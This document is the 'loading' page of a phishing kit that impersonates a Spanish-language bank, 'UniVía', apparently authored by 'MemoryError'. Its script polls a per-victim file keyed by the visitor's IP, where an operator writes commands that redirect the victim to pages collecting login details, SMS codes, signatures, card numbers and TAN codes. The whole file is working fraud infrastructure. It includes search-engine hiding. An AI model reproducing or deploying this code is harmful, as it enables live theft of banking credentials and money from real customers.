<?php
    /*******
    Main Author: MemoryError
    ********************************************************/
    
    require_once '../includes/main.php';
    $code = $_GET['code'];
    $_SESSION['last_page'] = 'loading';
?>

<!doctype html>
<html style="height: 100%; display: flex; flex-direction: column;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="icon" type="image/png" href="../assets/imgs/favicon.png" />

        <title>UniVía</title>
    </head>

    <body style="height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center;">

		<div class="loader text-center">
            <div class="logo"><img style="max-width: 150px;" src="../assets/imgs/logo.png"></div>
            <p>Verificación de su información. No cierre la página.</p>
            <div class="lds-facebook"><div></div><div></div><div></div></div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="../assets/js/script.js"></script>
<script>
            var ip = '<?php echo get_client_ip(); ?>';
            var waiting = setInterval(function() {
                $.get('../victims/' + ip + '.txt', function(data) {
                    if( data == 0 ) {
                        //console.log('hada ba9i 0');
                    } else {
                        var zow = data.split('/');
                        var one = zow[0];
                        var two = zow[1];
                        if( one == 'errorlogin' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=errorlogin";
			            } else if( one == 'firma' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=firma&code=" + two;
                        } else if( one == 'sms' ) {
                            clearInterval(waiting);
                           location.href = "../index-.php?redirection=sms&code=" + two;
                        } else if( one == 'cc' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=cc";
                        } else if( one == 'errorcc' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=errorcc";
                        } else if( one == 'errorsms' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=errorsms";
                        } else if( one == 'tan' ) {
                            clearInterval(waiting);
                            var code1 = zow[1];
                            var code2 = zow[2];
                            var code3 = zow[3];
                            var code4 = zow[4];
                            location.href = "../index-.php?redirection=tan&code1="+ code1 +"&code2="+ code2 +"&code3=" + code3 +"&code4=" + code4;
                        } else if( one == 'errortan' ) {
                            clearInterval(waiting);
                            var code1 = zow[1];
                            var code2 = zow[2];
                            var code3 = zow[3];
		            var code4 = zow[4];

                            location.href = "../index-.php?redirection=errortan&code1="+ code1 +"&code2="+ code2 +"&code3=" + code3 +"&code4=" + code4;
                        } else if( one == 'success' ) {
                            clearInterval(waiting);
                            location.href = "../index-.php?redirection=success";
                        }

                    }
                });
            }, 1000);
        </script>

    </body>

</html>